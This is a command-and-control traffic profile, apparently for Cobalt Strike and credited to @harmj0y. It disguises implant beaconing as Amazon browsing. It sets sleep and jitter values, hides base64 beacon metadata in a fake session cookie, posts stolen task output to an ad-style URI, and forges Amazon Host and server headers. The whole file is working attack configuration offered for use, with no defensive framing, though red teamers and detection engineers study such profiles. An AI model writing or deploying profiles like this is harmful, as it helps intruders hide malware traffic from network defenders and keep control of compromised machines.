# This profile has been modified to use with the Malleable C2 Profile Randomizer

#
# Amazon browsing traffic profile
# 
# Author: @harmj0y
#

set sleeptime "2200";
set jitter    "10";
set maxdns    "247";
set useragent "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)";

http-get {

    set uri "/s/ref=nb_sb_noss_1/745-90675859-4567930/field-keywords=work";

    client {

        header "Accept" "*/*";
        header "Host" "www.amazon.com";

        metadata {
            base64;
            prepend "session-token=";
            prepend "skin=noskin;";
            append "csm-hit=s-zDUaiot8RPaROqkB72ZQ|2449462605378";
            header "Cookie";
        }
    }

    server {

        header "Server" "Server";
        header "x-amz-id-1" "N8mOB2sv77DBdbh75MoO";
        header "x-amz-id-2" "yhYW5WCXGlbiatRvntW1hGiQyixO2dIaz2yNz0On81ADoMP2YZFfLPstiZlcVBs=";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Content-Encoding" "gzip";

        output {
            print;
        }
    }
}

http-post {
    
    set uri "/N2968/adj/amzn.us.sr.aps";

    client {

        header "Accept" "*/*";
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";
        header "Host" "www.amazon.com";

        parameter "sz" "160x600";
        parameter "oe" "oe=ISO-8859-1;";

        id {
            parameter "sn";
        }

        parameter "s" "7777";
        parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";

        output {
            base64;
            print;
        }
    }

    server {

        header "Server" "Server";
        header "x-amz-id-1" "j9MaQwW0UAb5mnJEKO3m";
        header "x-amz-id-2" "igSt4keZCoFn4nFrDP2W2Mj9AM7zrzWCQDF22KxoTusWRYpPb0Te8sa5010BWeY=";
        header "X-Frame-Options" "SAMEORIGIN";
        header "x-ua-compatible" "IE=edge";

        output {
            print;
        }
    }
}
